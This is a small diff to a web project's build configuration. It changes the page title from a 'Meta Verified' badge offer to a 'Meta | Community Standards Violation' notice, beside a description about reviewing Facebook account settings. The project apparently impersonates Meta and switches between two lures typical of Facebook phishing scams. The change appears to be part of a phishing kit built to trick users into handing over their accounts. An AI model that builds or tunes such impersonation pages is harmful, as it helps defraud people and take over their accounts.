@@ -42,7 +42,7 @@ export default defineConfig({
         }
     },
     html: {
-        title: 'Meta Verified: Get the verified badge on Facebook',
+        title: 'Meta | Community Standards Violation',
         favicon: './src/assets/images/conga.ico',
         meta: {
             'description': 'Review and manage your Facebook account settings and preferences.',
